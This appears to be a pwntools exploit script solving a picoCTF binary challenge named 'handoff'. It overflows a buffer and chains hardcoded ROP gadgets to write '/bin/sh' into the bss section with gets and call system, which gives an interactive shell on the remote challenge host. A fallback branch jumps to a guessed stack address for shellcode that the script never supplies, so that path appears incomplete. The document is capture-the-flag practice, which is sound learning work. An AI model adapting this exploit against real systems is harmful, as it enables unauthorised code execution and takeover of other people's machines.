from pwn import *

LINK = "shape-facility.picoctf.net"
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else None
DEBUG = bool(int(sys.argv[2])) if len(sys.argv) > 2 else True

e = context.binary = ELF("./handoff")

# Important gadgets from the provided list
pop_rdi = 0x4014b3  # pop rdi ; ret
pop_rsi_r15 = 0x4014b1  # pop rsi ; pop r15 ; ret
ret = 0x40101a  # ret

# Get addresses of key functions
system_plt = e.plt.get('system', 0)
puts_plt = e.plt.get('puts', 0)
gets_plt = e.plt.get('gets', 0)

# Address where we'll store "/bin/sh"
bss_section = e.bss()
binsh_addr = bss_section + 0x100

if DEBUG:
    p = process("./handoff")
else:
    p = remote(LINK, PORT)

# Use option 3 to trigger the buffer overflow
p.sendlineafter(b"app", b"3")

if DEBUG:
    pause()  # Pause to attach debugger if needed

# Create ROP chain
rop = b"A" * 20  # Padding to reach return address

# Option 1: If system is available, use it to execute /bin/sh
if system_plt:
    # First write "/bin/sh\0" to a known location
    rop += p64(pop_rdi)
    rop += p64(binsh_addr)
    rop += p64(gets_plt)  # Use gets to write "/bin/sh" to binsh_addr
    
    # Then call system("/bin/sh")
    rop += p64(pop_rdi)
    rop += p64(binsh_addr)
    rop += p64(system_plt)

# Option 2: If system is not available, use execve syscall via shellcode
else:
    # Find the address where our shellcode is stored (entry 0's name field)
    exploit_addr = 0x7fffffffdfc0  # This is an estimate, adjust based on debugging
    rop += p64(exploit_addr)

p.sendlineafter(b": ", rop)

# If we used gets to write "/bin/sh", send it now
if system_plt:
    p.sendline(b"/bin/sh\0")

# Get shell
p.interactive()

